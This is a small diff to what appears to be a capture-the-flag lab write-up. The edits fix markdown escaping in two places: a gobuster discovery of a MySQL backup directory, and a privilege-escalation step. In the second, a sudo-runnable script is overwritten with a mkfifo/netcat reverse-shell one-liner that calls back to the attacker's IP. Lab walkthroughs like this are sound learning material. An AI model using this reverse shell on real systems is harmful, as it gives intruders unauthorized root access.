@@ -43,7 +43,7 @@ gobuster dir -u http://10.65.136.171/content/ -w /usr/share/seclists/Discovery/W
 ```
 ![Gobuster Discovery](img/gobuster_discovery.png)
 
-* **Critical Find:** `/content/inc/mysql\_backup/` containing a SQL backup file.
+* **Critical Find:** `/content/inc/mysql_backup/` containing a SQL backup file.
 
 
 
@@ -126,7 +126,7 @@ The user can run `/usr/bin/perl /home/itguy/backup.pl` as root without a passwor
 3. **Payload Injection:** I overwrote the script with a reverse shell pointing to my machine:
 
 ```bash
-echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc <MY\_IP> 5556 >/tmp/f" > /etc/copy.sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <MY_IP> 5556 >/tmp/f" > /etc/copy.sh
 ```
 
 4. **Execution:** I ran the sudo command:
